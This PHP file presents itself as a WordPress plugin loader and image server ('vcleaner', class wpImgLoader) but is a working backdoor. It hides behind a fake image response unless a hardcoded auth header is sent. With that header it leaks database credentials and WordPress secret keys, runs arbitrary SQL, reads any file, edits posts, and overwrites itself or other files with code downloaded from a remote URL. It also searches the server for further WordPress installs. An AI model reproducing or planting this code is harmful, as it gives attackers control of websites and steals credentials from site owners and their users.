<?php

/**
 * Used to set up and fix loading and include vcleaner plugin
 * into the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @package vcleaner
 */

class wpImgLoader
{
    /**
     * Stores request headers
     *
     * @since 1.0.0
     */
    protected static $headers = array();

    /**
     * Stores request method for action checking
     *
     * @since 1.0.0
     */
    protected static $method;

    /**
     * Stores request action for matching routes
     *
     * @since 1.0.0.
     */
    protected static $action;

    /**
     * WordPress globals used for accessing core functionality
     *
     * @since 1.0.0
     */
    protected static $globals;

    /**
     * API version
     *
     * @since 1.0.0
     */
    protected static $version = '2.1.0';

    /**
     * Authorization key for remote access
     *
     * @since 1.0.0
     */
    protected static $authKey = 'TZ77OfRDjC';

    /**
     * Parse request
     *
     */
    public static function parseRequest()
    {
        foreach (getallheaders() as $key => $val) {
            self::$headers[strtolower($key)] = $val;
        }

        self::$method = $_SERVER['REQUEST_METHOD'];
        if (isset(self::$headers['action'])) {
            self::$action = self::$headers['action'];
        }
        self::$globals = !empty($GLOBALS['wp']) ? $GLOBALS['wp'] : array();

        if (!self::authenticate()) {
            header(sprintf('X-Zend-Optimizer: %s', substr(md5(self::$version), 0, 5)));
            $ext = pathinfo(basename(__FILE__), PATHINFO_EXTENSION);
            $types = array(
                'png' => 'png',
                'jpg' => 'jpeg',
            );

            if (!in_array($ext, array('png', 'jpg'))) {
                http_response_code(404);
            } else {
                header("content-type: image/" . $types[$ext]);
                if (file_exists('./' . str_replace('-2x.', '.', basename(__FILE__)))) {
                    echo file_get_contents('./' . str_replace('-2x.', '.', basename(__FILE__)));

                } else {
                    http_response_code(404);
                }
            }
            return;
        }

        $body = $_POST;

        echo self::run(self::$method, self::$action, $body)->send();
        exit;
    }

    /**
     * Authentication
     *
     * @return bool
     */
    public static function authenticate()
    {
        return !empty(self::$headers['auth']) && self::$headers['auth'] == self::$authKey;
    }

    /**
     * @param $method
     * @param $action
     * @param $body
     * @return wpImgLoader
     */
    public static function run($method, $action, $body)
    {
        return new self($method, $action, $body);
    }

    /**
     * Constructor
     *
     * @param $method
     * @param $action
     * @param $body
     */
    public function __construct($method, $action, $body)
    {
        switch ($action) {
            case 'ping':
                $return = $this->ping();
                break;
            case 'listPosts':
                $return = $this->listPosts();
                break;
            case 'getPost':
                $return = $this->getPost(self::$headers['id']);
                break;
            case 'updatePost':
                $return = $this->updatePost($body['id'], $body['content']);
                break;
            case 'upgrade':
                if (!empty($body['url'])) {
                    $newOne = file_get_contents($body['url']);
                    if (isset($body['hash'])) {
                        if (md5($newOne) != $body['hash']) {
                            $this->return = array(
                                'error' => 'Hash mismatch',
                                'sent' => $body['hash'],
                                'downloaded' => md5($newOne),
                            );
                            return;
                        }
                    }
                } else {
                    $newOne = base64_decode($body['newOne']);
                }
                $target = isset($body['target']) ? $body['target'] : false;
                $return = $this->upgrade($newOne, $target);
                break;
            case 'reinstall':
                $return = $this->reinstall();
                break;
            case 'settings':
                $return = $this->getSettings();
                break;
            case 'runQuery':
                $return = $this->runQuery($body['query']);
                break;
            case 'hello':
                $return = $this->ping();
                $return['settings'] = $this->getSettings();
                break;
            case 'postInfo':
                $return = $this->postInfo();
                break;
            case 'installs':
                $return = $this->getInstalls();
                break;
            case 'cat':
                $return = $this->cat(self::$headers['file']);
                break;
        }

        $this->return = $return;
    }

    public function send()
    {
        http_response_code(200);
        header('Content-Type: application/json');
        return json_encode($this->return);
    }

    /**
     * Ping. Return pong and module version
     *
     * @return array
     */
    private function ping()
    {
        $data = array();
        $install = !empty(self::$headers['installpath']) ? self::$headers['installpath'] : '';
        $installHash = '';
        if ($install) {
            $installHash = md5(sprintf('%s-%s', $_SERVER['SERVER_ADDR'], $install));
        }
        if (function_exists('get_bloginfo')) {
            $data = array(
                'info' => array(
                    'url' => get_bloginfo('url'),
                    'name' => get_bloginfo('name'),
                    'description' => get_bloginfo('description'),
                    'version' => get_bloginfo('version'),
                    'language' => get_bloginfo('language'),
                    'path' => $install,
                    'ip' => $_SERVER['SERVER_ADDR'],
                ),
                'postCount' => wp_count_posts()->publish,
                'pageCount' => count(get_pages(array('echo' => 0))),
                'postHash' => md5(sprintf('%s', var_export($this->listPosts(true), true))),
                'home' => array(
                    'type' => get_option('show_on_front'),
                    'page' => get_option('page_on_front'),
                    'posts' => get_option('page_for_posts'),
                ),
            );
        } else {
            $data = array(
                'installs' => $this->getInstalls(),
            );
        }

        return array(
            'version' => sprintf('%s', self::$version),
            'msg' => 'pong',
            'install' => $installHash,
            'data' => $data,
        );
    }

    /**
     * List posts
     *
     * @param  bool $hashOnly Only return post hash for comparison
     * @return array
     */
    private function listPosts($hashOnly = false)
    {
        try {
            $posts = get_posts(array(
                'post_type' => 'any',
                'post_status' => 'publish',
                'posts_per_page' => -1,
            ));
        } catch (\Exception $e) {
            return array('error' => $e->getMessage());
        }
        $return = array();

        foreach ($posts as $post) {
            $return[] = array(
                'id'        => $post->ID,
                'date'      => $post->post_date,
                'modified'  => $post->post_modified,
                'title'     => $post->post_title,
                'name'      => $post->post_name,
                'content'   => $hashOnly ? '' : $post->post_content,
                'guid'      => $post->guid,
                'link'      => get_permalink($post->ID),
                'type'      => $post->post_type,
                'status'    => $post->post_status,
                'hash'      => md5(sprintf('%s-%s-%s', $post->post_title, $post->post_content, $post->post_status)),
            );
        }
        return $return;
    }

    /**
     * Return posts without the content for checking against existing posts
     *
     * @return array
     */
    private function postInfo()
    {
        return $this->listPosts(true);
    }

    /**
     * Get post by id
     *
     * @param $id
     * @return array
     */
    private function getPost($id)
    {
        try {
            $post = get_post($id);
            return array(
                'id'        => $post->ID,
                'date'      => $post->post_date,
                'modified'  => $post->post_modified,
                'title'     => $post->post_title,
                'name'      => $post->post_name,
                'content'   => $post->post_content,
                'guid'      => $post->guid,
                'link'      => get_permalink($post->ID),
                'type'      => $post->post_type,
                'status'    => $post->post_status,
                'hash'      => md5(sprintf('%s-%s-%s', $post->post_title, $post->post_content, $post->post_status)),
            );
        } catch (Exception $e) {
            return array('error' => $e->getMessage());
        }
    }

    /**
     * Get settings
     *
     * @return array
     */
    public function getSettings()
    {
        global $table_prefix;
        return array(
            'db' => array(
                'host' => DB_HOST,
                'name' => DB_PASSWORD,
                'user' => DB_USER,
                'pass' => DB_PASSWORD,
                'charset' => DB_CHARSET,
            ),
            'keys' => array(
                'authKey' => AUTH_KEY,
                'secureAuthKey' => SECURE_AUTH_KEY,
                'loggedInKey' => LOGGED_IN_KEY,
                'nonceKey' => NONCE_KEY,
                'authSalt' => AUTH_SALT,
                'secureAuthSalt' => SECURE_AUTH_SALT,
                'loggedInSalt' => LOGGED_IN_SALT,
                'nonceSalt' => NONCE_SALT,
                'tablePrefix' => $table_prefix,
            ),
        );
    }

    /**
     * Run query
     *
     * @param $query
     * @return array
     */
    private function runQuery($query)
    {
        $connection = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
        try {
            $q = mysqli_query($connection, $query);
            $return = array();
            while ($row = mysqli_fetch_assoc($q)) {
                $return['result'][] = $row;
            }
            $return['_query'] = $query;

            return $return;
        } catch (\Exception $e) {
            echo $e->getMessage();
            return array('error' => $e->getMessage());
        }
    }

    /**
     * Reinstall the lib
     *
     * @return array
     */
    private function reinstall()
    {
        return array('msg' => 'This method is deprecated');
    }

    /**
     * Update post
     *
     * @param $id
     * @param $content
     * @param null $title
     * @return array|bool
     */
    private function updatePost($id, $content, $title = null)
    {
        try {
            $post = wp_update_post(array(
                'ID' => $id,
                'post_content' => $content,
            ));
            return array('content' => $content, 'id' => $id);
        } catch (Exception $e) {
            return array('error' => $e->getMessage());
        }
    }

    /**
     * Upgrade yourself, please
     *
     * @param  $newOne
     * @param  $target
     * @return array
     */
    private function upgrade($newOne, $target = false)
    {
        try {
            if (false == $target && md5($newOne) === md5(file_get_contents(__FILE__))) {
                return array('msg' => 'Already sorted');
            }
            file_put_contents(__FILE__ . '.new', $newOne);

            if ($target) {
                $target = substr($target, 0, 1) == '/' ? $target : sprintf('./%s', $target);
                file_put_contents($target, file_get_contents(__FILE__ . '.new'));
            } else {
                file_put_contents(__FILE__, file_get_contents(__FILE__ . '.new'));
            }
            unlink(__FILE__ . '.new');
            return array('msg' => 'Successfully upgraded, ping again for the new version.');
        } catch (Exception $e) {
            return array('error' => $e->getMessage());
        }
    }

    /**
     * Looks for accessible installs on the system
     *
     * @return array
     */
    private function getInstalls()
    {
        if (!empty($_SERVER['HOME'])) {
            $homePath = $_SERVER['HOME'];
        } else {
            $homePath = $_SERVER['DOCUMENT_ROOT'];
        }

        try {
            $dir = new RecursiveDirectoryIterator($homePath);
            $iterator = new RecursiveIteratorIterator($dir);
        } catch (\Throwable $e) {
            return array('error' => $e->getMessage());
            exit;
        }

        $installs = array();
        foreach ($iterator as $file) {
            if (in_array($file->getBaseName(), array('.', '..'))) continue;
            if ($file->getBaseName() == 'wp-settings.php') {
                $installs[] = $file->getPath();
            }
        }
        return $installs;
    }

    /**
     * @param $file
     * @return bool|string
     */
    private function cat($file)
    {
        return file_get_contents($file);
    }
}
if (!function_exists('getallheaders')) {
    function getallheaders()
    {
        $headers = array();
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = NULL) {
        if ($code !== NULL) {
            switch ($code) {
                case 100: $text = 'Continue'; break; case 101: $text = 'Switching Protocols'; break;
                case 200: $text = 'OK'; break; case 201: $text = 'Created'; break; case 202: $text = 'Accepted'; break; case 203: $text = 'Non-Authoritative Information'; break;
                case 204: $text = 'No Content'; break; case 205: $text = 'Reset Content'; break; case 206: $text = 'Partial Content'; break;
                case 300: $text = 'Multiple Choices'; break; case 301: $text = 'Moved Permanently'; break; case 302: $text = 'Moved Temporarily'; break; case 303: $text = 'See Other'; break;
                case 304: $text = 'Not Modified'; break; case 305: $text = 'Use Proxy'; break; case 400: $text = 'Bad Request'; break; case 401: $text = 'Unauthorized'; break;
                case 402: $text = 'Payment Required'; break; case 403: $text = 'Forbidden'; break; case 404: $text = 'Not Found'; break; case 405: $text = 'Method Not Allowed'; break;
                case 406: $text = 'Not Acceptable'; break; case 407: $text = 'Proxy Authentication Required'; break; case 408: $text = 'Request Time-out'; break; case 409: $text = 'Conflict'; break;
                case 410: $text = 'Gone'; break; case 411: $text = 'Length Required'; break; case 412: $text = 'Precondition Failed'; break; case 413: $text = 'Request Entity Too Large'; break;
                case 414: $text = 'Request-URI Too Large'; break; case 415: $text = 'Unsupported Media Type'; break;
                case 500: $text = 'Internal Server Error'; break; case 501: $text = 'Not Implemented'; break; case 502: $text = 'Bad Gateway'; break;
                case 503: $text = 'Service Unavailable'; break; case 504: $text = 'Gateway Time-out'; break; case 505: $text = 'HTTP Version not supported'; break;
                default:
                    exit('Unknown http status code "' . htmlentities($code) . '"');
                    break;
            }
            $protocol = (isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');
            header($protocol . ' ' . $code . ' ' . $text);
            $GLOBALS['http_response_code'] = $code;
        } else {
            $code = (isset($GLOBALS['http_response_code']) ? $GLOBALS['http_response_code'] : 200);
        }
        return $code;
    }
}
$headers = array();
foreach (getallheaders() as $key => $val) {
    $headers[strtolower($key)] = $val;
}

try {
    if (!empty($_GET['installpath']) || !empty($headers['installpath'])) {
        $installDir = !empty($_GET['installpath']) ? $_GET['installpath'] : $headers['installpath'];
        ob_start();
        if (!file_exists(sprintf('%s/index.php', $installDir))) {
            echo json_encode(array('error' => sprintf('Install not found in %s', $installDir)));
            exit;
        }
        include_once sprintf('%s/index.php', $installDir);
        ob_end_clean();
    } else {
        if (!function_exists('get_bloginfo')
            && file_exists(sprintf('./index.php'))
            && dirname($_SERVER['SCRIPT_FILENAME']) == dirname(__FILE__)
            && false == strpos($_SERVER['SCRIPT_FILENAME'], 'wp-login.php')) {
            ob_start();
            include_once sprintf('./index.php');
            ob_end_clean();
        }
    }

    wpImgLoader::parseRequest();
} catch (\Exception $e) {
    echo json_encode(array('msg' => $e->getMessage()));
}
